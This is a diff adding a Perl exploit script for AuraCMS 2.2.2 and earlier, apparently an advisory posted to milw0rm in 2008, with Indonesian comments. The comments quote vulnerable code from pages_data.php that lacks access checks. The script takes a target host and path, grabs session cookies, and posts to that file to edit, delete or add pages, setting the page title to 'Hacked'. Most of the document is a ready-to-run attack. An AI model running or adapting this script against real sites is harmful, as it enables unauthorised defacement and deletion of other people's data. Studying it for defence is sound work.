@@ -1,0 +1,109 @@
+#!/usr/bin/perl
+# k1tk4t Public Security Advisory
+# ////////////////////////////////////////////////////////////
+# AuraCMS <= 2.2.2 (pages_data.php) Arbitrary Edit/Add/Delete data halaman exploit 
+# Vendor	: http://www.auracms.org/
+# Kutu		: ./js/pages/pages_data.php
+# Keterangan	: 
+# pada berkas pages_data.php dari awal hingga akhir tidak adanya aturan yang jelas, siapa, hak, level
+# dalam mengakses berkas ini, kenapa perlu kejelasan aturan untuk berkas ini? 
+# karena didalam berkas ini terdapat kode yang dapat menghapus(delete)
+# menambahkan(add), mengedit(edit) data halaman didalam database auracms, sehingga
+# dengan tidak adanya kejelasan aturan pada berkas pages_data.php ini 
+# maka berkas ini mutlak terdapat KUTU yang amat menjijikan.... huee.....   :( 
+# potongan kode dari pages_data.php
+# --//--
+# 03: @ob_start('ob_gzhandler');
+# 04: @header("Content-type: text/plain; charset=utf-8;");
+# 05: @header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
+# 06: @header("Pragma: no-cache");
+# 07:
+# 08: include '../../includes/session.php';
+# 09: include '../../includes/config.php';
+# 10: include '../../includes/fungsi.php';
+# 11: include '../../includes/mysql.php';
+# 12: include '../../includes/json.php';
+# 13:
+# 14:
+# 15: if (!isset($_SESSION['mod_ajax'])){
+# 16: exit;   
+# 17: }
+# --//--
+# Lihat.... tidak ada aturan di baris pertama hingga baris ke 17, mengenai siapa, hak, level dan aturan lainnya
+# dalam mengakses berkas ini
+# --//--
+# 20: switch (@$_GET['action']){
+# 21:        
+# 22: case 'add':
+# 23: $_POST = array_map ('decodeURIComponent',$_POST);
+# 24: $judul = $_POST['judul'];
+# 25: $konten = $_POST['konten'];
+# 26: $open['error'] = false;
+# 27: $open['errorpesan'] = '';
+# 28: if (!empty($judul) && !empty($konten)){
+# 29: $query = mysql_query ("INSERT INTO `halaman` (`judul`,`konten`) VALUES ('$judul','$konten')");
+# 30: if ($query){
+# --//--
+# diatas ini satu contoh bagaimana berkas ini berperilaku, lihat... bisa menambahkan data halaman pada database kan... 
+# kacoooo, kacoooo,  :( 
+# selebihnya liat sendiri yaa... panjang soalnya... :p
+#
+# Terimakasih untuk ;
+# str0ke,DNX,n0c0py,L41n,
+# NTOS-Team->[fl3xu5,opt1lc,sakitjiwa],
+# eCHo->[y3dips,K-159,lirva32,dan staff lainnya] 
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Getopt::Long;
+
+if ( !$ARGV[1] ) {
+	print "\n ///////////////////////////////////////////////////////////";
+	print "\n //                ..::> k1tk4t <::..                     //";
+	print "\n //     AuraCMS <= 2.2.2 (pages_data.php)                 //";
+	print "\n //     Arbitrary Edit/Add/Delete data halaman exploit    //";
+	print "\n ///////////////////////////////////////////////////////////";
+	print "\n[!] ";
+	print "\n[!] Penggunaan : perl auracms_pagesdata.pl [Site] [Path] [id_halaman] [options]";
+	print "\n[!] Contoh     : perl auracms_pagesdata.pl localhost /toko/ 1 -o 1";
+	print "\n[!] Options : 1=Edit , 2=Delete, 3=Add";
+	print "\n";
+	exit;
+}
+my $host = $ARGV[0];
+my $path = $ARGV[1];
+my $idhalaman = $ARGV[2];
+my $isijudul = "AuraCMS <= 2.2.2 Hacked";
+my $isikonten = "Mohon Perhatian!!! terdapat kutu pada berkas pages_data.php, Arbitrary Edit-Add-Delete data halaman";
+my $ambilkue = "http://".$host.$path."index.php";
+my $browser = LWP::UserAgent->new;
+my $kue = HTTP::Cookies->new();
+my $hasil = "";
+%options = ();
+GetOptions(\%options, "o=i",);
+if($options{"o"} && $options{"o"} == 1) { 
+$arbitrary = "http://".$host.$path."js/pages/pages_data.php?action=edit_saved&id="; 
+}
+if($options{"o"} && $options{"o"} == 2) { 
+$arbitrary = "http://".$host.$path."js/pages/pages_data.php?action=delete&id="; 
+}
+if($options{"o"} && $options{"o"} == 3) { 
+$arbitrary = "http://".$host.$path."js/pages/pages_data.php?action=add&id="; 
+}
+
+$hasil = $browser->get($arbitrary);
+if(!$hasil->is_success) {
+die("[!] Gagal, berkas pages_data.php tidak tersedia\n");
+}
+
+#  ambil kue dari website
+$hasil = $browser->get($ambilkue);
+$kue->extract_cookies($hasil);
+$browser->cookie_jar($kue);
+
+# arbitrary exploit 
+$arbitrary .= $idhalaman;
+$hasil = $browser->post($arbitrary,["judul"=>$isijudul,"konten"=>$isikonten],);
+$konten = $hasil->content;
+print $konten ;
+
+# milw0rm.com [2008-07-09]
